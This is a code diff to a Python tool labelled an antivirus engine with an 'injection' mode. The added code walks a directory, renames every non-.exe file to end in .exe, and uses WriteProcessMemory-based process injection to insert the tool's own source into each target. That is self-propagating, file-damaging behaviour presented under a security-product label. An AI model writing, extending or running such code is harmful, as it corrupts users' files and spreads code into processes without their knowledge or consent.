@@ -1298,7 +1298,7 @@ def allocate_and_write(process_handle, data):
     if not addr:
         print("Failed to allocate memory in remote process.")
         sys.exit(1)
-    written = wintypes.SIZE_T(0)
+    written = ctypes.c_size_t(0)
     if not ctypes.windll.kernel32.WriteProcessMemory(process_handle, addr, data, size, ctypes.byref(written)):
         print("Failed to write memory in remote process.")
         sys.exit(1)
@@ -1335,12 +1335,12 @@ def resume_process(thread_handle):
 
 def set_remote_breakpoint(process_handle, address):
     original_byte = ctypes.create_string_buffer(1)
-    bytesRead = wintypes.SIZE_T(0)
+    bytesRead = ctypes.c_size_t(0)
     if not ctypes.windll.kernel32.ReadProcessMemory(process_handle, address, original_byte, 1, ctypes.byref(bytesRead)):
         print("Failed to read memory for breakpoint.")
         sys.exit(1)
     int3 = b"\xCC"
-    bytesWritten = wintypes.SIZE_T(0)
+    bytesWritten = ctypes.c_size_t(0)
     if not ctypes.windll.kernel32.WriteProcessMemory(process_handle, address, int3, 1, ctypes.byref(bytesWritten)):
         print("Failed to write breakpoint.")
         sys.exit(1)
@@ -1374,24 +1374,42 @@ def inject_python_script(target_exe, python_script_content):
 
 def main():
     parser = argparse.ArgumentParser(description="Hydra Dragon Antivirus Engine & Injection Hybrid")
-    parser.add_argument("path", help="Path to the file or directory to scan, OR target exe for injection")
+    parser.add_argument("path", help="Path to the file or directory to scan, OR target file/directory for injection")
     parser.add_argument("--auto-create", action="store_true", help="Auto create new signature if none matched (scan mode)")
     parser.add_argument("--benign", action="store_true", help="Force auto-created signature to be labeled as benign (scan mode)")
     parser.add_argument("--inject", action="store_true", help="Enable injection mode (always inject self)")
-    parser.add_argument("--target", help="Path to target executable for injection (in injection mode)")
     args = parser.parse_args()
     
     if args.inject:
-        if not args.target:
-            print("Injection mode requires --target argument.", file=sys.stderr)
+        if not os.path.exists(args.path):
+            print("Error: The specified path does not exist.", file=sys.stderr)
             sys.exit(1)
-        if not os.path.exists(args.target):
-            print("Error: Target executable does not exist.", file=sys.stderr)
-            sys.exit(1)
-        # Always inject self (the current engine's source code)
+        # Determine if the path is a file or directory
+        targets = []
+        if os.path.isfile(args.path):
+            targets.append(args.path)
+        elif os.path.isdir(args.path):
+            # Iterate over all files in the directory and add executable files;
+            # if file is not an .exe, rename it by appending .exe (for injection purposes)
+            for root, dirs, files in os.walk(args.path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    if not file_path.lower().endswith(".exe"):
+                        new_path = file_path + ".exe"
+                        try:
+                            os.rename(file_path, new_path)
+                            print(f"Renamed {file_path} to {new_path} for injection.")
+                            file_path = new_path
+                        except Exception as ex:
+                            print(f"Failed to rename {file_path}: {ex}", file=sys.stderr)
+                            continue
+                    targets.append(file_path)
+        # Always inject self (the current engine's source code) into every target
         with open(__file__, "r", encoding="utf-8") as f:
             script_content = f.read()
-        inject_python_script(args.target, script_content)
+        for target in targets:
+            print(f"Injecting self into {target} ...")
+            inject_python_script(target, script_content)
     else:
         if not os.path.exists(args.path):
             print("Error: The specified path does not exist.", file=sys.stderr)
